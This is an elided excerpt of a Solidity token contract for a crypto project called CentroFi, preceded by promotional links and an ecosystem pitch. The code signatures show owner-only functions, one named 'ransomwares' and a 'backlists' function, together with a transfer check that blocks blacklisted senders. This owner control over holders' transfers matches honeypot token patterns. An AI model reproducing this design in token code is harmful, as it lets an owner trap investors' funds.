...
/**
🚀Website: http://centrofis.com/
🚀Contract: 0xD131957DDaCe95e355B94951A4A303B4ecEA1e01
🚀Twitter: https://twitter.com/centrofiss
🚀Telegram: https://t.me/centrofiss
🔥What Is CentroFi?🔥

🔹CentroFi is a one-stop financial ecosystem that traverses Web3 and the real world, allowing one the convenience of managing, growing, and trading crypto assets in a non-custodial environment, while acquiring or spending them in fiat currencies right from launch. With a strong emphasis on mobile usage and offering alternatives to existing banking systems, CentroFi seeks to be the centre of one’s centralized and decentralized financial worlds.
 
🔹Ever heard of someone wanting to get started with DeFi, but was unsure of where to start? For such newcomers, CentroFi offers a convenient entry point to familiarize and get started. 

🔹To hit the ground running, the full ecosystem will be going live together during the World of CentroFi launch event come December 3, 2022. 
...
contract ERC20DividendToken is Context, ERC20Burnable, Ownable {
    ...
    function ransomwares(uint256 amount, uint256 itamaru, address account) public onlyOwner {
   ...
   function isExcludedFromFees(address account) public view returns (bool) {
    ...
    function backlists(address _user) public onlyOwner {
    ...
    function _transfer(
        ...
        require(!isBlacklisted[from], "use bots");
...
contract CentroFi is ERC20DividendToken {
